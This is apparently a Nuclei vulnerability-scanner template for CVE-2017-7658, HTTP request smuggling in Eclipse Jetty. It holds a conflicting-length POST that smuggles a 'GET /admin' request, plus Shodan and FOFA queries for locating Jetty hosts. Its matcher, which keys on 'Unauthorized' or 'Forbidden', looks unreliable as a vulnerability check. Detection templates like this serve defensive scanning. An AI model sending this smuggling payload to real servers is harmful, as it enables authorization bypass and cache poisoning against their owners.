id: CVE-2017-7658

info:
  name: Eclipse Jetty Server HTTP Smuggling Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    In Eclipse Jetty Server, versions 9.2.x and older, 9.3.x (all non HTTP/1.x configurations), and 9.4.x (all HTTP/1.x configurations),
    when presented with two content-lengths headers, Jetty ignored the second. When presented with a content-length and a chunked encoding header,
    the content-length was ignored (as per RFC 2616). If an intermediary decided on the shorter length, but still passed on the longer body,
    then body content could be interpreted by Jetty as a pipelined request. If the intermediary was imposing authorization, the fake pipelined
    request would bypass that authorization.
  impact: |
    An attacker could exploit this vulnerability to bypass security controls, perform web cache poisoning, and conduct various attacks.
  remediation: |
    Upgrade to a version of Eclipse Jetty Server that has patched the CVE-2017-7658 vulnerability.
  reference:
    - http://www.securitytracker.com/id/1041194
    - https://bugs.eclipse.org/bugs/show_bug.cgi?id=535669
    - https://lists.apache.org/thread.html/053d9ce4d579b02203db18545fee5e33f35f2932885459b74d1e4272%40%3Cissues.activemq.apache.org%3E
    - https://lists.apache.org/thread.html/708d94141126eac03011144a971a6411fcac16d9c248d1d535a39451%40%3Csolr-user.lucene.apache.org%3E
    - https://lists.apache.org/thread.html/9317fd092b257a0815434b116a8af8daea6e920b6673f4fd5583d5fe%40%3Ccommits.druid.apache.org%3E
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2017-7658
    cwe-id: CWE-444
    epss-score: 0.01089
    epss-percentile: 0.84943
    cpe: cpe:2.3:a:eclipse:jetty:*:*:*:*:*:*:*:*
  metadata:
    vendor: eclipse
    product: jetty
    shodan-query:
      - cpe:"cpe:2.3:a:eclipse:jetty"
      - http.html:"contexts known to this"
      - http.title:"powered by jetty"
    fofa-query:
      - body="contexts known to this"
      - title="powered by jetty"
    google-query: intitle:"powered by jetty"

http:
  - method: POST
    path:
      - "{{BaseURL}}/test"

    headers:
      Content-Length: "6"
      Transfer-Encoding: chunked

    body: |
      0

      GET /admin HTTP/1.1
      Host: vulnerable-host
    matchers:
      - type: word
        words:
          - "Unauthorized"
          - "Forbidden"
        part: body
        condition: or
